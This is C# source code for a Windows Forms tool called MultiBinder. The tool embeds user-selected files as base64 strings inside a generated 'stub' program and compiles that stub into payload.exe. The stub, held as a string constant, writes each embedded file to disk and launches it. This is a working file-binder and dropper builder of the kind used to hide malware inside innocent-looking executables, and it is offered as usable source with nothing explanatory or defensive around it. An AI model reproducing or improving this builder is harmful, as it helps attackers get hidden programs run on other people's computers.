using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace MultiBinder
{
    public partial class frmMain : Form
    {

        #region " Stub code."

        public static string stubCode = "using System;namespace Payload{    class payload    {        static void Main()        {            String[] payloads = new string[] { %%PAYLOADS%% };            foreach(String payload in payloads)            {                string b64 = payload.Split(\'™\')[0];                string plName = payload.Split(\'™\')[1];                dropFiles(b64, plName);            }        }        static void dropFiles(string payload, string payloadName)        {            System.IO.File.WriteAllBytes(Environment.CurrentDirectory + @\"\\\" + payloadName, Convert.FromBase64String(payload));            System.Diagnostics.Process.Start(Environment.CurrentDirectory + @\"\\\" + payloadName);        }    }}";

        #endregion



        public frmMain()
        {
            InitializeComponent();
        }

        private void frmMain_Load(object sender, EventArgs e)
        {
            MaximumSize = Size;
            MinimumSize = Size;
        }

        private void removeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if(lbFiles.SelectedItem != null)
            {
                lbFiles.Items.Remove(lbFiles.SelectedItem);
            }
        }

        private void addToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                if(ofd.ShowDialog() == DialogResult.OK)
                {
                    lbFiles.Items.Add(ofd.FileName);
                }
            }
        }

        private void bindToolStripMenuItem_Click(object sender, EventArgs e)
        {
            List<String> payloads = new List<string>();
            foreach(String payload in lbFiles.Items)
            {
                payloads.Add(payload);
                Console.WriteLine(payload);
            }
            preparePayload(payloads);

        }


        //"%payloadData%™%payloadName%" 
        public static void preparePayload(List<String> payloads)
        {
            string replaceData = "%payloadData%™%payloadName%";

            string payloadData = null;

            foreach(String payload in payloads)
            {
                if(payloadData != null)
                {
                    payloadData += ", ";
                }
                payloadData += replaceData.Replace("%payloadName%", payload.Substring(payload.LastIndexOf(@"\") + 1) + "\"").Replace("%payloadData%", "\"" + Convert.ToBase64String(System.IO.File.ReadAllBytes(payload)));
            }

            stubCode = stubCode.Replace("%%PAYLOADS%%", payloadData);

            Console.WriteLine(CodeDOM.Compile(stubCode, Application.StartupPath + @"\payload.exe"));
            MessageBox.Show("Complete!");
        }
    }
}
